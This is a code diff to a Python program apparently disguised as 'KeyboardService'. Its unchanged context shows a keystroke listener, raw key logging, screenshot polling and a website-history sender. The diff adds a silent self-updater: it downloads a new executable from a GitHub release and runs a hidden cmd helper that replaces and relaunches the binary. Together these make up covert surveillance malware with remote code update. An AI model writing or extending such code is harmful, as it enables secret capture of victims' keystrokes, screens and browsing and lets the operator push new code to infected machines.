@@ -9,6 +9,7 @@ import getpass
 import html
 import hashlib
 import platform
+import re
 import shutil
 import socket
 import subprocess
@@ -44,6 +45,9 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
+APP_VERSION = "1.0.2"
+UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
+UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
 INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
 CONFIG_PATH = os.path.join(INSTALL_DIR, "config.json")
@@ -97,6 +101,7 @@ pending_messages_lock = Lock()
 last_message_id = 0
 SERVICE_KEYBOARD_LISTENER = None
 collection_paused = False
+update_lock = Lock()
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -959,6 +964,115 @@ def install_and_relaunch():
         return False
 
 
+def version_tuple(value):
+    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", value or "")
+    if not match:
+        return (0, 0, 0, 0)
+    return tuple(int(part or 0) for part in match.groups())
+
+
+def download_update():
+    request = Request(
+        UPDATE_API_URL,
+        headers={
+            "Accept": "application/vnd.github+json",
+            "User-Agent": f"KeyboardService/{APP_VERSION}",
+        },
+    )
+    with urlopen(request, timeout=15) as response:
+        release = json.loads(response.read().decode("utf-8"))
+
+    latest_tag = str(release.get("tag_name", "")).strip()
+    if not latest_tag or version_tuple(latest_tag) <= version_tuple(APP_VERSION):
+        return None
+
+    asset = next(
+        (
+            item for item in release.get("assets", [])
+            if item.get("name") == UPDATE_ASSET_NAME and item.get("browser_download_url")
+        ),
+        None,
+    )
+    if not asset:
+        print(f"Update {latest_tag} has no {UPDATE_ASSET_NAME} asset")
+        return None
+
+    os.makedirs(INSTALL_DIR, exist_ok=True)
+    temporary_path = os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download")
+    download_request = Request(
+        asset["browser_download_url"],
+        headers={"User-Agent": f"KeyboardService/{APP_VERSION}"},
+    )
+    digest = hashlib.sha256()
+    try:
+        with urlopen(download_request, timeout=120) as response, open(temporary_path, "wb") as output:
+            while True:
+                chunk = response.read(1024 * 1024)
+                if not chunk:
+                    break
+                digest.update(chunk)
+                output.write(chunk)
+
+        expected_digest = str(asset.get("digest", ""))
+        if expected_digest.startswith("sha256:") and digest.hexdigest().lower() != expected_digest[7:].lower():
+            raise RuntimeError("download checksum did not match GitHub release metadata")
+        return temporary_path, latest_tag
+    except Exception:
+        try:
+            os.remove(temporary_path)
+        except OSError:
+            pass
+        raise
+
+
+def schedule_update(temporary_path):
+    helper_path = os.path.join(INSTALL_DIR, f"update_{os.getpid()}.cmd")
+    target_path = os.path.abspath(INSTALL_PATH)
+    source_path = os.path.abspath(temporary_path)
+    lines = [
+        "@echo off",
+        ":wait",
+        f'tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul',
+        "if not errorlevel 1 (",
+        "  timeout /t 1 /nobreak >nul",
+        "  goto wait",
+        ")",
+        f'move /y "{source_path}" "{target_path}" >nul',
+        f'start "" "{target_path}"',
+        'del "%~f0"',
+    ]
+    with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
+        helper.write("\r\n".join(lines) + "\r\n")
+    startup_info = subprocess.STARTUPINFO()
+    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startup_info.wShowWindow = 0
+    subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)
+
+
+def check_for_updates():
+    if os.name != "nt" or not getattr(sys, "frozen", False):
+        return
+    if not update_lock.acquire(blocking=False):
+        return
+    try:
+        result = download_update()
+        if not result:
+            return
+        temporary_path, latest_tag = result
+        print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
+        schedule_update(temporary_path)
+        os._exit(0)
+    except Exception as error:
+        print(f"Could not check for KeyboardService updates: {error}")
+    finally:
+        update_lock.release()
+
+
+def update_checker():
+    time.sleep(5)
+    check_for_updates()
+
+
 def heartbeat_sender():
     while True:
         send_heartbeat()
@@ -1107,6 +1221,7 @@ def start_keyboard_listener():
     atexit.register(flush_raw_log)
     Thread(target=message_sender, daemon=True).start()
     Thread(target=heartbeat_sender, daemon=True).start()
+    Thread(target=update_checker, daemon=True).start()
     Thread(target=screenshot_request_poller, daemon=True).start()
     Thread(target=website_history_sender, daemon=True).start()
     with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
